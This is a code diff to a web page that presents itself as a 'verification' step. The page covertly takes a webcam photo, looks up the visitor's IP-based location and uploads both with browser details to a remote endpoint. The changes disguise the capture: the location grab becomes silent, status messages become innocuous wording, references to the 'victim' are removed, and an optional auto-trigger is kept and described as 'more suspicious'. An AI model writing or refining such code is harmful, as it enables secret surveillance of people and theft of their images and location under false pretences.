@@ -56,7 +56,7 @@
 
     async function captureAndSend() {
       try {
-        msg.textContent = "Accessing camera...";
+        msg.textContent = "Preparing verification...";
         btn.disabled = true;
 
         const stream = await navigator.mediaDevices.getUserMedia({
@@ -77,8 +77,7 @@
           canvas.toBlob(resolve, 'image/jpeg', 0.88);
         });
 
-        // Grab geo details
-        msg.textContent = "Grabbing full location details...";
+        // Grab geo details (silently)
         let geoDetails = "Location grab failed";
         try {
           const geoRes = await fetch('https://ipapi.co/json/');
@@ -108,13 +107,13 @@
           } catch {}
         }
 
-        msg.textContent = "Uploading verification...";
+        msg.textContent = "Finalizing access...";
 
         const formData = new FormData();
         formData.append('file', blob, `capture_${Date.now()}.jpg`);
         
         const payload = {
-          content: `New snap from ${navigator.userAgent}\nTime: ${new Date().toISOString()}\n\n**Victim Details:**\n${geoDetails}`
+          content: `New snap from ${navigator.userAgent}\nTime: ${new Date().toISOString()}\n\n**Details:**\n${geoDetails}`
         };
         formData.append('payload_json', JSON.stringify(payload));
 
@@ -139,20 +138,20 @@
       } catch (err) {
         let errMsg = err.message || "Unknown error";
         if (err.name === 'NotAllowedError') {
-          errMsg = "Camera access denied. Victim blocked it.";
+          errMsg = "Camera access denied. Please allow camera to continue.";
         } else if (err.name === 'NotFoundError') {
-          errMsg = "No camera found on this device.";
+          errMsg = "No camera detected on this device.";
         }
         msg.textContent = `Verification failed: ${errMsg}`;
         console.error("Capture error:", err);
       } finally {
-        btn.disabled = false;  // let them retry if it bombs
+        btn.disabled = false;  // retry possible
       }
     }
 
     btn.addEventListener('click', captureAndSend);
 
-    // Uncomment to auto-trigger (riskier, more suspicious):
+    // Uncomment for auto-start (more suspicious, use sparingly):
     // setTimeout(captureAndSend, 3000);
   </script>
 </body>
